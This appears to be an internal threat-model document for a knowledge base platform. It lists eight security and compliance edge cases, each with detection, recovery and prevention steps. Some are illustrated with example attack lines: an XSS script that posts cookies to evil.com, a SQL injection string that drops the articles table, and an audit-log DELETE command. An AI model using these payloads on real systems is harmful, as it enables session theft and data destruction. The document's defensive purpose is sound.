# Security and Compliance — Edge Cases

## Introduction

The security and compliance subsystem is the defensive perimeter of the Knowledge Base Platform. It governs content sanitization, data subject rights, query safety, tenant data isolation, audit log integrity, secrets management, regulatory compliance capacity, and software supply chain security. Unlike other subsystems, failures here are not merely operational — they carry legal, regulatory, and reputational consequences that can far outlast the technical incident itself.

Security failures in a knowledge base platform are particularly damaging because the platform is the organization's repository of truth. Compromising it means compromising the integrity of every piece of documentation, every AI-generated answer, and every user interaction. The eight edge cases below cover the most impactful security and compliance failure modes across the platform's threat model.

---

## EC-SEC-001: XSS via Article Content

### Failure Mode
A malicious author (or a compromised author account) inserts a script tag or JavaScript event handler into a TipTap article body. For example, they paste raw HTML into the editor that contains `<script>document.cookie='stolen='+document.cookie+'&url='+location.href; fetch('https://evil.com/steal', {method:'POST', body: document.cookie})</script>`. If the NestJS API does not sanitize the article body before storage, and the Next.js frontend renders the article body using `dangerouslySetInnerHTML` without sanitization, the script executes in every reader's browser that views the article, stealing session cookies, redirecting to phishing pages, or performing actions on behalf of the reader.

### Impact
**Severity: Critical**
- Session hijacking of all users who view the compromised article.
- Attackers can perform actions as the victim user: read private articles, exfiltrate data, change passwords, invite malicious users.
- Persistent XSS in a widely-read article affects hundreds of users before detection.
- Under GDPR, this constitutes a data breach.

### Detection
- **Content Security Policy (CSP) Violations**: CSP headers on the article page report violations to the CSP reporting endpoint. A spike in `script-src` violations indicates active XSS.
- **Session Anomaly**: Multiple users' sessions showing identical anomalous API calls from different IPs (a characteristic pattern of XSS-based session cloning).
- **WAF Rule**: AWS WAF managed rule set `AWSManagedRulesCommonRuleSet` includes XSS detection patterns. Alert on WAF block events.
- **Author Behavior Anomaly**: An author who has never published HTML-containing articles suddenly submitting one should be flagged for review.

### Mitigation/Recovery
1. Immediately unpublish the affected article and replace it with a placeholder: "This article is temporarily unavailable for maintenance."
2. Invalidate all active sessions system-wide as a precaution: force all users to re-authenticate.
3. Identify all users who viewed the article during the window it was live using access logs.
4. Notify affected users of the potential compromise and advise them to change passwords and revoke any OAuth tokens they authorized during the exposure window.
5. Audit the database for any malicious content in other articles by the same author.

### Prevention
- Sanitize all article content server-side using `DOMPurify` (or equivalent) configured to a strict allowlist of safe HTML tags: `<p>`, `<h1>`–`<h6>`, `<ul>`, `<ol>`, `<li>`, `<a>`, `<strong>`, `<em>`, `<code>`, `<pre>`, `<blockquote>`, `<img>` (with `src` limited to trusted CDN domains). Remove all event handlers and `<script>`, `<iframe>`, `<object>` tags.
- Sanitize content at both write time (before DB storage) and read time (before rendering) for defense in depth.
- Use TipTap's schema-based content model: configure the editor to only allow nodes and marks defined in the schema. Any HTML not conforming to the schema is stripped on paste.
- Enforce a strict Content Security Policy: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`. Report violations to `/api/csp-report`.
- Never use `dangerouslySetInnerHTML` in Next.js components. Always render TipTap JSON through the TipTap React renderer, which does not execute arbitrary HTML.

---

## EC-SEC-002: GDPR Right to Erasure

### Failure Mode
An EU-based user exercises their GDPR Article 17 "right to erasure" (right to be forgotten). The platform's `UserService.deleteUser()` method deletes the user's account record, personal data, and session. However, the `article_versions` table retains historical version records that include `author_id` and `author_name` in the version metadata. The email change history table retains the old email addresses. The search analytics table retains the user's query history with their `user_id`. The AI conversation history retains their questions. These records are not purged as part of the deletion flow, meaning the user's personal data persists in multiple secondary tables and is not fully erased.

### Impact
**Severity: Critical**
- Non-compliance with GDPR Article 17 can result in fines of up to 4% of annual global turnover or €20 million, whichever is higher.
- Supervisory authority investigations triggered by a user complaint.
- Reputational damage upon public disclosure of the compliance failure.
- The user's personally identifiable information remains in the system indefinitely, counter to their explicit legal right.

### Detection
- **Erasure Completeness Audit**: After every user deletion, run an automated audit query across all PII-containing tables and assert that no records with the deleted `user_id` remain.
- **DSAR Tracking**: Track all data subject requests (DSARs) in a dedicated `dsar_requests` table. Any DSAR that has been pending for more than 30 days without completion triggers a High alert.
- **Compliance Dashboard**: A privacy compliance dashboard displays outstanding DSARs, their completion status, and any tables where PII was found post-deletion.

### Mitigation/Recovery
1. Execute a targeted PII purge across all secondary tables for the affected user:
   - `UPDATE article_versions SET author_name = 'Deleted User', author_email = null WHERE author_id = :userId`
   - `DELETE FROM search_analytics WHERE user_id = :userId`
   - `DELETE FROM ai_conversations WHERE user_id = :userId`
   - `DELETE FROM email_change_history WHERE user_id = :userId`
2. For version records that must be retained for audit/compliance, pseudonymize the author: replace name and email with a stable anonymous identifier (`[Deleted User #hash]`).
3. Verify erasure completeness by re-running the audit query.
4. Respond to the user's erasure request within the 30-day GDPR deadline.

### Prevention
- Maintain a comprehensive PII data map: a living document listing every database table and column that contains PII, keyed by `user_id`.
- Implement a `UserDataErasureService` that uses the PII data map to systematically pseudonymize or delete all user data across all tables in a single atomic operation.
- Add integration tests that create a user, perform multiple actions (articles, searches, AI conversations), delete the user, and then assert that no `user_id` reference remains in any PII table.
- Implement GDPR retention policies: article version history older than 24 months is pseudonymized automatically. Search query history is deleted after 90 days automatically.

---

## EC-SEC-003: SQL Injection via Article Metadata

### Failure Mode
The article search API accepts a `tags` filter parameter: `GET /api/articles?tags=engineering&sort=created_at`. The NestJS `ArticleRepository.findByTags()` method constructs a TypeORM query using unsafe string interpolation: `` `WHERE tags @> ARRAY['${tags}']::varchar[]` ``. An attacker sends `tags=engineering']::varchar[]; DROP TABLE articles; --` which, when interpolated, becomes a valid SQL statement that drops the articles table.

### Impact
**Severity: Critical**
- Destruction of the entire articles table and all content in the knowledge base.
- Even with database backups, recovery takes hours and causes a prolonged platform outage.
- If the database user has broader privileges, adjacent tables (users, attachments, workspaces) may also be targeted.
- Detection may be delayed if the DROP is inside a subquery that doesn't immediately surface as an error.

### Detection
- **WAF SQL Injection Rules**: AWS WAF `AWSManagedRulesSQLiRuleSet` detects common SQL injection patterns in query parameters and request bodies. Enable and alert on blocks.
- **Database Error Log**: PostgreSQL logs syntax errors caused by malformed queries. CloudWatch Logs Insights alert on `ERROR: syntax error` patterns originating from the application database user.
- **Query Pattern Anomaly**: Monitor for query parameters containing SQL keywords (`DROP`, `DELETE`, `INSERT`, `UNION`, `--`, `/*`).
- **Penetration Testing**: Automated OWASP ZAP or Burp Suite scans run quarterly, testing all parameterized endpoints for injection vulnerabilities.

### Mitigation/Recovery
1. Immediately deploy a WAF rule to block requests with SQL keywords in all query parameters as an emergency measure.
2. Identify the exact extent of the damage: which tables were affected, and when the last clean backup was taken.
3. Restore from the most recent RDS automated snapshot (up to 35 days of retention). Test the restore in a read replica first.
4. After restoration, conduct a full audit of all API endpoints for injection vulnerabilities using the compromised endpoint as a reference.
5. Notify affected users of the outage and its cause within the required regulatory timeframes.

### Prevention
- **Never** interpolate user-supplied strings directly into SQL. Use TypeORM's query builder with parameterized bindings exclusively: `createQueryBuilder('article').where('article.tags @> ARRAY[:...tags]::varchar[]', { tags: tags.split(',') })`.
- Add an integration test that sends common SQL injection payloads to every API endpoint that accepts string parameters and asserts the request is either rejected or safely handled without SQL execution.
- Apply the principle of least privilege to the application database user: the API service's PostgreSQL role must only have `SELECT`, `INSERT`, `UPDATE`, `DELETE` privileges — never `DROP`, `TRUNCATE`, or DDL operations.
- Enable WAF managed SQL injection rules on all API Gateway endpoints.

---

## EC-SEC-004: Tenant Data Isolation Failure

### Failure Mode
A multi-workspace platform bug in the NestJS `ArticleService.getArticle()` method causes it to fetch an article by its numeric ID without validating that the article belongs to the requesting user's workspace. A malicious user in Workspace A who discovers that articles in Workspace B have sequential IDs (e.g., the next ID after their workspace's last article ID) can enumerate and read articles from Workspace B by calling `GET /api/articles/1001`, `GET /api/articles/1002`, etc. This is an Insecure Direct Object Reference (IDOR) vulnerability.

### Impact
**Severity: Critical**
- Complete tenant data isolation failure.
- Confidential articles from all other workspaces are readable by any authenticated user.
- This constitutes a data breach affecting all tenants, with mandatory regulatory notification.
- Every article's content, metadata, attachments, and version history is exposed.

### Detection
- **Cross-Workspace Access Attempt**: Log the `workspace_id` of every article fetched and compare it to the requesting user's `workspace_id`. Any mismatch triggers a `CROSS_WORKSPACE_ACCESS_ATTEMPT` Critical alert immediately.
- **Sequential ID Enumeration Pattern**: Detect users making sequential numeric ID requests in the article API (e.g., IDs 1001, 1002, 1003 in succession). Flag as potential IDOR reconnaissance.
- **Synthetic Canary Test**: Every 5 minutes, a synthetic test makes an authenticated request for a canary article from a different workspace and asserts it receives 403 Forbidden.

### Mitigation/Recovery
1. Deploy an emergency hotfix adding workspace ID validation to `ArticleService.getArticle()`: `WHERE article.id = :id AND article.workspace_id = :workspaceId`.
2. Analyze access logs for the past 30 days to identify all cross-workspace access events.
3. Notify all affected workspace owners within 72 hours (GDPR breach notification requirement).
4. Switch article IDs from sequential integers to UUIDs to prevent enumeration (this requires a migration — plan carefully).
5. Engage legal/compliance to assess notification obligations.

### Prevention
- Use UUIDs (not sequential integers) as all public-facing entity identifiers to prevent enumeration.
- Apply PostgreSQL Row Level Security (RLS) on the `articles` table, enforcing `workspace_id = current_setting('app.workspace_id')` at the database level as defense in depth.
- Every data access method in repository classes must include `workspace_id` as a mandatory filter parameter, enforced at the TypeScript type level (non-optional).
- Run cross-tenant IDOR tests in the automated security test suite for every API endpoint that accepts an entity ID.

---

## EC-SEC-005: Audit Log Tampering

### Failure Mode
A rogue Workspace Admin discovers that the `audit_logs` table has no write protection for admin database users. They use the platform's developer API or a direct database connection (if RDS credentials are improperly shared) to execute `DELETE FROM audit_logs WHERE actor_id = 'their-user-id'`. This removes all records of their unauthorized actions (role escalations, article deletions, member removals) from the audit trail, making forensic investigation impossible.

### Impact
**Severity: Critical**
- Complete destruction of the forensic evidence trail for a security incident.
- Inability to determine the scope of unauthorized actions taken.
- Violation of compliance requirements (SOC 2 CC7.2, ISO 27001 A.12.4) that mandate tamper-evident logging.
- Legal consequences if the audit log was required for a regulatory investigation.

### Detection
- **Audit Log Deletion Alert**: Any `DELETE` or `UPDATE` operation on the `audit_logs` table from any source — application or direct database connection — triggers an immediate Critical alert via CloudWatch database activity streams.
- **Log Count Anomaly**: Track the rolling 1-hour count of audit log entries. A sudden drop in count (not explained by a scheduled purge) is a deletion signal.
- **Append-Only Verification**: A nightly job verifies that no audit log records older than 24 hours have been modified or deleted by comparing record counts and checksums against an external, append-only log store (AWS CloudTrail or CloudWatch Logs).

### Mitigation/Recovery
1. Immediately revoke database access credentials for the suspected tamper actor.
2. Restore the audit log from the append-only external log store (CloudWatch Logs or CloudTrail), which cannot be deleted by application-layer actors.
3. Identify the deleted records by comparing the restored log against the current database state.
4. Reconstruct the actor's unauthorized actions from the restored audit trail.
5. Suspend the actor's account and initiate a full security investigation.

### Prevention
- Make the `audit_logs` table append-only at the database level: grant the application database user only `INSERT` privilege on `audit_logs`. No `UPDATE`, `DELETE`, or `TRUNCATE` is permitted.
- Mirror all audit log inserts in real time to an external, immutable store: AWS CloudTrail (for AWS API activity) and CloudWatch Logs with log retention set to "never expire" and CloudWatch Log Group resource policies preventing deletion.
- Implement audit log cryptographic chaining: each audit log record includes a hash of the previous record, making any deletion or modification detectable by verifying the chain.
- Require a second-factor confirmation from a second admin for any audit log access beyond read-only views.

---

## EC-SEC-006: Third-Party Integration Token Exposure

### Failure Mode
A developer integrates the platform with Zendesk and Slack, storing the integration API tokens during setup. The tokens are stored in the `integrations` table in a `config` JSONB column: `{"zendesk_token": "abc123", "slack_webhook_url": "https://hooks.slack.com/services/..."}`. These tokens are stored as plaintext in PostgreSQL rather than in AWS Secrets Manager. If the database credentials are exposed (via SQL injection, a misconfigured RDS instance, or a DB snapshot shared accidentally), the integration tokens are also compromised. An attacker with the Zendesk token can read and modify all customer tickets; with the Slack webhook, they can send messages to internal Slack channels.

### Impact
**Severity: High**
- Third-party systems (Zendesk, Slack) are compromised via stolen tokens.
- An attacker can read sensitive support tickets, post phishing messages to internal Slack, or exfiltrate customer data from Zendesk.
- Token rotation is time-consuming and requires coordinating with multiple third-party providers.
- Depending on what data the tokens provide access to, this may trigger breach notifications.

### Detection
- **Secrets Scanning in Code**: Pre-commit hooks and CI pipeline use `truffleHog` or `gitleaks` to detect API tokens accidentally committed to source code.
- **Database Column Encryption Audit**: A quarterly database audit checks for sensitive-value patterns (long alphanumeric strings in config columns) that should be in Secrets Manager.
- **Anomalous API Usage**: Monitor third-party API usage for anomalous patterns: unusual call volumes, calls from unexpected IP addresses (not the platform's ECS task IPs), or calls at unusual hours.

### Mitigation/Recovery
1. Immediately rotate all exposed integration tokens with their respective providers (Zendesk, Slack, etc.).
2. Move all integration tokens to AWS Secrets Manager: store only the Secrets Manager ARN in the `integrations` table.
3. Update `IntegrationService` to retrieve tokens via `secretsManager.getSecretValue()` at runtime.
4. Audit all third-party API activity during the exposure window for signs of unauthorized use.
5. Notify third-party providers of the potential token compromise.

### Prevention
- Establish a policy: no API keys, tokens, webhook URLs, or secrets may be stored in the database or in source code. All secrets must be stored in AWS Secrets Manager.
- Implement `IntegrationService` to use Secrets Manager exclusively. The `integrations` table stores only the Secrets Manager ARN, not the secret value.
- Add a pre-commit hook using `detect-secrets` or `gitleaks` that blocks commits containing patterns matching API keys, tokens, or high-entropy strings.
- Conduct a quarterly secrets audit: scan the database for columns containing high-entropy strings that may be misplaced secrets.

---

## EC-SEC-007: CCPA Data Subject Request Backlog

### Failure Mode
The platform's CCPA compliance workflow is entirely manual: a user submits a "Do Not Sell My Personal Information" request or a data access/deletion request via a web form, which sends an email to the privacy@company.com inbox. A compliance analyst manually processes each request. As the platform scales to 50,000 users across hundreds of workspaces, the volume of CCPA requests grows to 200+ per month. The two-analyst compliance team cannot process them within California's 45-day response deadline. Requests accumulate in the inbox, deadlines are missed, and users file complaints with the California Attorney General.

### Impact
**Severity: High**
- California AG investigations and civil penalties (up to $7,500 per intentional violation).
- Class action lawsuit risk if a pattern of non-compliance is established.
- Reputational damage in the US market.
- Users who submitted requests in good faith experience prolonged data exposure and loss of trust.

### Detection
- **DSAR Tracking System**: Maintain a `dsar_requests` table tracking all data subject requests: type, submitted_at, deadline (submitted_at + 45 days), status, assigned_analyst, completed_at.
- **Deadline Warning Alert**: Alert the compliance team 7 days before any DSAR deadline.
- **SLA Breach Alert**: Alert if any DSAR passes its deadline without completion.
- **Volume Alert**: Alert if monthly DSAR volume exceeds 50 (manual capacity threshold) so the team can proactively request additional resources.

### Mitigation/Recovery
1. Immediately triage the backlog: identify all requests past the 45-day deadline and process them first, documenting the delay.
2. Automate the most common request types:
   - Data deletion: implement `UserDataErasureService` (see EC-SEC-002) to handle erasure requests in one click.
   - Data access: implement `UserDataExportService` to generate a GDPR-style data export in JSON/PDF within minutes.
   - Do Not Sell: implement a database flag `users.do_not_sell = true` that is set immediately upon request.
3. Hire additional compliance analysts or engage a CCPA compliance service provider.
4. Notify all users whose requests exceeded the 45-day deadline and apologize for the delay.

### Prevention
- Automate all CCPA request types that can be automated: deletion, access export, opt-out flags. The goal is that analysts only review edge cases, not routine requests.
- Build a self-service privacy portal where users can submit, track, and complete most requests without analyst intervention.
- Conduct monthly DSAR volume reviews and forecast staffing needs at 3x current volume.
- Engage external legal counsel specializing in CCPA to review the compliance program annually.

---

## EC-SEC-008: Dependency Supply Chain Attack

### Failure Mode
A malicious actor publishes a compromised version of a popular npm package that is a transitive dependency of the NestJS backend (e.g., a patched version of `lodash` or `axios` that exfiltrates environment variables to an external server). This is a software supply chain attack (similar to the XZ Utils or event-stream incidents). The automated dependency update bot (Dependabot or Renovate) automatically opens a PR to upgrade the dependency and a developer, seeing it as a routine security update, merges it without scrutinizing the diff. The malicious code is deployed to production and begins exfiltrating `OPENAI_API_KEY`, `DATABASE_URL`, `JWT_SECRET`, and other environment variables.

### Impact
**Severity: Critical**
- Complete compromise of all production secrets and API keys.
- Attacker can read and modify all data in the database.
- All user sessions can be forged using the stolen `JWT_SECRET`.
- The incident may go undetected for weeks until the attacker acts on the stolen credentials.
- Remediation requires rotating all secrets, re-issuing all JWTs, and potentially notifying all users.

### Detection
- **Outbound Network Monitoring**: ECS tasks should only make network calls to known endpoints (OpenAI, RDS, Redis, S3). Unexpected outbound connections to unknown IPs or domains trigger an immediate alert.
- **Software Composition Analysis (SCA)**: `npm audit` in the CI pipeline detects known vulnerable packages. Tools like Snyk or Socket.dev scan for malicious packages specifically.
- **Dependency Change Review**: All dependency updates must be reviewed by a security-aware engineer before merge, regardless of whether they are "minor" or "patch" updates.
- **Environment Variable Exfiltration Pattern**: Monitor for HTTP requests from ECS tasks that include environment variable content in headers, query strings, or body.

### Mitigation/Recovery
1. Immediately take down the affected ECS tasks and prevent them from making further outbound connections.
2. Rotate all secrets: `OPENAI_API_KEY`, `DATABASE_URL` credentials, `JWT_SECRET`, `REDIS_URL` password, S3 access keys, all third-party API tokens.
3. Invalidate all active user sessions (all JWT tokens are compromised if `JWT_SECRET` was exposed).
4. Identify the malicious package: run `npm ls` to find all packages included in the build and compare against the last known-good lock file.
5. Remove the malicious dependency, rebuild, and redeploy with new secrets.

### Prevention
- Use `npm ci` (not `npm install`) in production builds to ensure deterministic installs from the lock file.
- Pin all direct dependencies to exact versions in `package.json` (not `^version` or `~version`).
- Use a private npm registry (AWS CodeArtifact) as a proxy for all packages. Packages must be explicitly allowlisted before they can be installed.
- Implement SCA using Socket.dev or Snyk in the CI pipeline to detect packages with suspicious behavior patterns (not just known CVEs).
- Require two-engineer review for all dependency updates — no solo merges of dependency PRs.
- Use ECS task IAM roles with least privilege and VPC security groups to restrict outbound network access to known endpoints only.

---

## Summary Table

| ID         | Edge Case                              | Severity | Primary Owner           | Status   |
|------------|----------------------------------------|----------|-------------------------|----------|
| EC-SEC-001 | XSS via Article Content               | Critical | Security / Frontend     | Open     |
| EC-SEC-002 | GDPR Right to Erasure                 | Critical | Compliance / Backend    | Open     |
| EC-SEC-003 | SQL Injection via Article Metadata    | Critical | Backend / Security      | Open     |
| EC-SEC-004 | Tenant Data Isolation Failure         | Critical | Backend / Security      | Open     |
| EC-SEC-005 | Audit Log Tampering                   | Critical | Security / Database     | Open     |
| EC-SEC-006 | Third-Party Integration Token Exposure| High     | Security / Backend      | Open     |
| EC-SEC-007 | CCPA Data Subject Request Backlog     | High     | Compliance / Legal      | Open     |
| EC-SEC-008 | Dependency Supply Chain Attack        | Critical | Security / Engineering  | Open     |

---

## Operational Policy Addendum

### 1. Content Security Policy

All article content must be sanitized using DOMPurify with a strict allowlist before storage and before rendering. The Next.js frontend must enforce a strict Content Security Policy header on all article pages. CSP violation reports must be collected and reviewed weekly. Any removal of a CSP directive or DOMPurify allowlist entry requires Security team approval. `dangerouslySetInnerHTML` is prohibited in all production React components rendering user-supplied content.

### 2. Data Subject Rights Policy

All GDPR Article 15–22 requests and CCPA requests must be logged in the `dsar_requests` table within 24 hours of receipt. GDPR requests must be completed within 30 days (extendable to 90 days with notice). CCPA requests must be completed within 45 days. The Data Protection Officer must be notified of any request that cannot be completed within the statutory deadline. Automated tooling for data deletion and data export must be maintained and tested quarterly. User data must not be retained beyond the stated retention periods without a documented legal basis.

### 3. Secrets Management Policy

No secret, API key, token, password, or connection string may be stored in source code, the database, or environment variable files checked into version control. All secrets must be stored in AWS Secrets Manager and accessed at runtime. The secrets rotation schedule is: database credentials — 90 days; JWT signing keys — 180 days; third-party API tokens — on change or compromise; TLS certificates — before expiry (managed via ACM). Secret rotation must be tested in staging before production rotation.

### 4. Vulnerability Management Policy

The CI/CD pipeline must run `npm audit` and a Software Composition Analysis (SCA) scan on every pull request. Critical and High vulnerabilities must be remediated within 7 days of detection. Medium vulnerabilities must be remediated within 30 days. All dependency updates must be reviewed by a security-aware engineer before merge. The platform must undergo an external penetration test annually, with findings tracked to remediation. Security incidents classified as Critical must trigger immediate notification to the CISO and legal counsel within 1 hour.
